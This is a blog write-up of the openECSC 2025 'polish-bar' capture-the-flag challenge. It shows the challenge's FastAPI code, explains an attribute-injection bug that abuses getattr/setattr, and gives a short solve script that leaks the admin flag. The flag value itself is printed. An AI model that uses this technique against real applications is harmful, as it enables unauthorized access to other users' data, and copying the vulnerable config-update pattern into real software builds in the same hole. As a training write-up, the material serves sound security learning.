---
title: "openESEC 2025 - web/polish-bar"
layout: single
classes: wide
date: 2025-10-06
categories: blog
toc: true
toc_label: "Table of contents"
---

# Polish-bar

> This Web Application was made to adapt to polish (drinking) culture :3

## Setup

We have a frontend serving some `Jinja` templates that has some http endpoints we can use to ~~get hella drunk~~ understand what the polish bar has to offer. All endpoint endpoints somewhat modify the `BeverageConfig` of our account. There is an admin account that has the flag:

```py
app = FastAPI()
templates = Jinja2Templates(directory="templates")
sessions = {}

def admin_session_setup():
    session_id = str(uuid.uuid4())

    sessions[session_id] = {
        'username': 'admin',
        'password': str(os.urandom(10).hex()),
        'config': BeverageConfig(os.getenv('FLAG', 'openECSC{TEST_FLAG}'))
    }

admin_session_setup()


@app.get("/")
...

@app.get("/register")
...

@app.post("/register")
async def post_register(request: Request, username: str = Form(...), password: str = Form(...)):

    new_session_id = str(uuid.uuid4())

    sessions[new_session_id] = { 'username': username, 'password': password, 'config': BeverageConfig(None) }

    response = RedirectResponse(url="/profile", status_code=303)
    response.set_cookie(key="session", value=new_session_id, httponly=True)
    return response


@app.get("/profile")
async def get_profile(request: Request):

    session_id = request.cookies.get('session')

    if session_id in sessions:
        return templates.TemplateResponse("profile.html", {
            "request": request, 
            "username": sessions[session_id]['username'],
            "config": sessions[session_id]['config'].get_config()
        })

    return RedirectResponse(url="/register", status_code=303)


@app.post("/config")
async def update_config(request: Request, config: str = Form(...), value: str = Form(...)):

    session_id = request.cookies.get('session')

    if session_id in sessions:
        err = sessions[session_id]['config'].update_property(config, value)

        return templates.TemplateResponse("profile.html", {
            "request": request, 
            "username": sessions[session_id]['username'],
            "config": sessions[session_id]['config'].get_config(),
            "error": 'Beverage is not in your shelf!' if err else ''
        })

    return RedirectResponse(url="/register", status_code=303)


@app.post("/beverage")
async def update_config(request: Request, beverage: str = Form(...)):

    session_id = request.cookies.get('session')

    if session_id in sessions:
        sessions[session_id]['config'].add_beverage(beverage)

        return templates.TemplateResponse("profile.html", {
            "request": request, 
            "username": sessions[session_id]['username'],
            "config": sessions[session_id]['config'].get_config()
        })

    return RedirectResponse(url="/register", status_code=303)


@app.post("/empty")
async def update_config(request: Request):

    session_id = request.cookies.get('session')

    if session_id in sessions:
        sessions[session_id]['config'].empty_alcohol_shelf()

        return templates.TemplateResponse("profile.html", {
            "request": request, 
            "username": sessions[session_id]['username'],
            "config": sessions[session_id]['config'].get_config()
        })

    return RedirectResponse(url="/register", status_code=303)
```

The http endpoint to `register` is pretty important to obtain a session. Afterwards, we have the endpoints `config`,`empty` and `beverage` which I mapped to the methods below in the class `BeverageConfig` and `PreferenceConfig`.

```py
    def get_property(self, val):
        try:
            if hasattr(self.alcohol_shelf, val):
                return getattr(self.alcohol_shelf, val)

            return getattr(self, val)
        except:
            return

    # /config
    def update_property(self, key: str, val: str):
        attr = self.get_property(val)
        if attr:
            setattr(self, key, attr)
            return
        return { 'error': 'property doesn\'t exist!' }
    
    # /empty
    def empty_alcohol_shelf(self):
        if hasattr(self.alcohol_shelf, "_alcohol_shelf"):
            self.alcohol_shelf._alcohol_shelf = [self.alcohol_shelf._alcohol_shelf[0]]
        else:
            self.alcohol_shelf = self.alcohol_shelf[0]

    # /beverage
    def add_beverage(self, beverage: str):
        self.alcohol_shelf._alcohol_shelf.append(beverage)

```

Let's disect what each method does:

- `update_property` retrieves the attribute `val` and sets the attribute `key` to its value
- `empty_alcohol_shelf` will shorten the list `self.alcohol_shelf._alcohol_shelf` to its first value to the list `self.alcohol_shelf` to its first value
- `add_beverage` add an item to the list `self.alcohol_shelf._alcohol_shelf`

If you are not familiar with the special methods `getattr`, `setattr` and `hasattr` --- I got you covered in the next section!

Furthermore, the class `PreferenceConfig` and thus `BeverageConfig` due to inheritance have one interesting class variable `_all_instances`. The `__init__` for `PreferenceConfig` append every newly created object to that class as long it inherited from `PreferenceConfig`. 

## Python refresher on instance and objects vars

Below is a small playground I created if you want to try it on your own first. At the end, I included the challenge classes such that you can play around to try to solve this ctf on your own.

<iframe
  src="https://bluuuk.github.io/blog-jupyterlite/lab/index.html?path=/openECSC-playground.ipynb"
  id="jlite"
  width="100%"
  height="1000px">
</iframe>

## Intuition

<details>
  <summary>Click to reveal hint</summary>

  Here is the hidden hint. You can write **Markdown** here too.
</details>

## Step by step guide


## Final Solve

We use an `Session` which automatically glues cookie to subsequent http request once they set - here its the `session` cookie:

```py
import requests
session = requests.Session()
base = "https://3a454160-13f7-4fdc-beaf-ea41d11839cb.openec.sc:1337"

session.post( f"{base}/register", data={"username":"admin","password":"lol"})
session.post(f"{base}/config",data={"config":"alcohol_shelf","value":"_all_instances"})
session.post(f"{base}/empty")
print(session.post(f"{base}/profile"))
```

Executing our solve script gives us our well deserved flag :)

```bash
❯ python solve.py | grep open
                    openECSC{gggrrrrrrr_ppyytthhonnn_8c719052fa04}
                               value="openECSC{gggrrrrrrr_ppyytthhonnn_8c719052fa04}">
````
